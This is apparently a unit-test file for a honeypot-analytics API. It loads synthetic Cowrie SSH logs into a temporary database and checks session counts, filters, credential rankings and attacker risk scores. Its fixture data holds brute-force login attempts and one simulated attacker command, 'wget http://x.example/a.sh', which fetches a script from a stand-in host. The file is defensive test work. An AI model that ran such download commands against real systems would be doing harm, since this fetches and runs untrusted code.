"""API tests against a small temporary database (no real data needed).
Run: python -m unittest discover -s tests"""
import json
import tempfile
import unittest
from pathlib import Path

import pandas as pd
from fastapi.testclient import TestClient

from api.main import create_app
from src import analysis, database
from src.parser import parse_log_file
from src.sessionizer import build_sessions

BOT = "Brute-force Bot"
HUMAN = "Interactive / Human-like"
SCANNER = "Scanner / Recon"


def ev(eventid, ts, ip, sid, **extra):
    base = {"eventid": eventid, "timestamp": ts, "src_ip": ip, "session": sid}
    base.update(extra)
    return json.dumps(base)


D1, D2 = "2026-01-01T10:00:", "2026-01-02T10:00:"
LINES = [
    # s1: 1.1.1.1 got in and ran a download command (Jan 1)
    ev("cowrie.session.connect", D1 + "00.000Z", "1.1.1.1", "s1"),
    ev("cowrie.login.failed", D1 + "01.000Z", "1.1.1.1", "s1", username="root", password="123"),
    ev("cowrie.login.failed", D1 + "02.000Z", "1.1.1.1", "s1", username="admin", password="admin"),
    ev("cowrie.login.success", D1 + "03.000Z", "1.1.1.1", "s1", username="root", password="toor"),
    ev("cowrie.command.input", D1 + "05.000Z", "1.1.1.1", "s1", input="wget http://x.example/a.sh"),
    ev("cowrie.session.closed", D1 + "05.000Z", "1.1.1.1", "s1", duration=5.0),
    # s2: 2.2.2.2 brute-force (Jan 1)
    ev("cowrie.session.connect", D1 + "10.000Z", "2.2.2.2", "s2"),
    ev("cowrie.login.failed", D1 + "11.000Z", "2.2.2.2", "s2", username="root", password="x"),
    ev("cowrie.login.failed", D1 + "12.000Z", "2.2.2.2", "s2", username="root", password="y"),
    ev("cowrie.login.failed", D1 + "13.000Z", "2.2.2.2", "s2", username="test", password="z"),
    ev("cowrie.session.closed", D1 + "13.000Z", "2.2.2.2", "s2", duration=3.0),
    # s3: 2.2.2.2 again (Jan 2)
    ev("cowrie.session.connect", D2 + "00.000Z", "2.2.2.2", "s3"),
    ev("cowrie.login.failed", D2 + "01.000Z", "2.2.2.2", "s3", username="root", password="q"),
    ev("cowrie.session.closed", D2 + "01.000Z", "2.2.2.2", "s3", duration=1.0),
    # s4: 3.3.3.3 scanner (Jan 1)
    ev("cowrie.session.connect", D1 + "20.000Z", "3.3.3.3", "s4"),
    ev("cowrie.session.closed", D1 + "21.000Z", "3.3.3.3", "s4", duration=1.0),
]


class TestAPI(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.db = base / "test.db"
        log = base / "log.json"
        log.write_text("\n".join(LINES), encoding="utf-8")

        events, _ = parse_log_file(log)
        sessions = build_sessions(events)
        database.init_db(reset=True, db_path=self.db)
        database.load_events(events, db_path=self.db)
        database.load_sessions(sessions, db_path=self.db)

        intel = pd.DataFrame([
            {"src_ip": "1.1.1.1", "country": "Germany", "country_code": "DE",
             "city": "Berlin", "latitude": 52.5, "longitude": 13.4},
            {"src_ip": "2.2.2.2", "country": "Unknown", "country_code": None,
             "city": None, "latitude": None, "longitude": None},
            {"src_ip": "3.3.3.3", "country": "Unknown", "country_code": None,
             "city": None, "latitude": None, "longitude": None},
        ])
        database.load_ip_intel(intel, db_path=self.db)

        clusters = pd.DataFrame({
            "session": ["s1", "s2", "s3", "s4"],
            "src_ip": ["1.1.1.1", "2.2.2.2", "2.2.2.2", "3.3.3.3"],
            "cluster_id": [0, 1, 1, 2],
            "behavior": [HUMAN, BOT, BOT, SCANNER],
        })
        analysis.save_table("session_clusters", clusters, db_path=self.db)

        self.client = TestClient(create_app(db_path=self.db))

    def tearDown(self):
        self.tmp.cleanup()

    def test_health(self):
        r = self.client.get("/health")
        self.assertEqual(r.status_code, 200)
        self.assertTrue(r.json()["database_ready"])

    def test_overview(self):
        data = self.client.get("/api/overview").json()
        self.assertEqual(data["sessions"], 4)
        self.assertEqual(data["unique_ips"], 3)
        self.assertEqual(data["failed_logins"], 6)
        self.assertEqual(data["successful_sessions"], 1)

    def test_behavior_filter(self):
        r = self.client.get("/api/overview", params={"behavior": [BOT]})
        self.assertEqual(r.json()["sessions"], 2)

    def test_date_filter(self):
        r = self.client.get("/api/overview", params={"start": "2026-01-02", "end": "2026-01-02"})
        self.assertEqual(r.json()["sessions"], 1)

    def test_bad_date_range_rejected(self):
        r = self.client.get("/api/overview", params={"start": "2026-02-01", "end": "2026-01-01"})
        self.assertEqual(r.status_code, 422)

    def test_timeline_and_hourly(self):
        timeline = self.client.get("/api/timeline").json()
        self.assertEqual(sum(row["sessions"] for row in timeline), 4)
        hourly = self.client.get("/api/hourly").json()
        self.assertEqual(len(hourly), 24)
        self.assertEqual(sum(row["sessions"] for row in hourly), 4)

    def test_credentials(self):
        users = self.client.get("/api/credentials", params={"kind": "username"}).json()
        self.assertEqual(users[0], {"value": "root", "count": 5})
        cmds = self.client.get("/api/credentials", params={"kind": "command"}).json()
        self.assertEqual(cmds[0]["value"], "wget http://x.example/a.sh")

    def test_invalid_credential_kind_rejected(self):
        r = self.client.get("/api/credentials", params={"kind": "hash"})
        self.assertEqual(r.status_code, 422)

    def test_map_only_has_ips_with_coordinates(self):
        points = self.client.get("/api/map").json()
        self.assertEqual(len(points), 1)
        self.assertEqual(points[0]["src_ip"], "1.1.1.1")
        self.assertEqual(points[0]["latitude"], 52.5)

    def test_attackers_ranked_by_risk(self):
        rows = self.client.get("/api/attackers").json()
        self.assertEqual(rows[0]["src_ip"], "1.1.1.1")
        self.assertAlmostEqual(rows[0]["risk_score"], 51.2)
        self.assertEqual(rows[0]["risk_level"], "Medium")
        self.assertEqual(rows[0]["country"], "Germany")

    def test_missing_database_returns_503(self):
        client = TestClient(create_app(db_path=Path(self.tmp.name) / "nope.db"))
        self.assertEqual(client.get("/api/overview").status_code, 503)
        self.assertFalse(client.get("/health").json()["database_ready"])


if __name__ == "__main__":
    unittest.main()